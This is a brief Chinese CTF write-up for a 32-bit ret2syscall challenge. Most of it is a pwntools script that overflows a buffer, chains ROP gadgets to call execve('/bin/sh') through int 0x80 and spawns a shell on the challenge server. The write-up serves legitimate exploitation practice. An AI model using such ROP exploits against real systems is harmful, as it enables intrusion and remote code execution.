# 挑战简介
32位的ret2syscall

# 思路
ret2syscall其实和前面的ret2libc有异曲同工的地方,只不过稍微要点汇编的基础以及指令之类的

构建rop顺序  

**对于32位**  
传入参数的寄存器顺序是：eax，ebx，ecx，edx，而具体寄存器的作用可以参考其作用表  

然后再用ROPgadget获取其地址，cyclic获取偏移量即可  
```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='i386', log_level='debug')

p = remote("pwn.challenge.ctf.show",28296)
elf = ELF('D:\edge 下载\pwn')

offset = 0x70

pop_eax = 0x080bb196

pop_ebx = 0x0806eb90

bin_sh = 0x080BE408

int_80 = 0x08049421

payload = flat([b'a'*offset, pop_ebx, 0, 0, bin_sh, pop_eax, 0xb, int_80])

p.sendline(payload)

p.interactive()

```
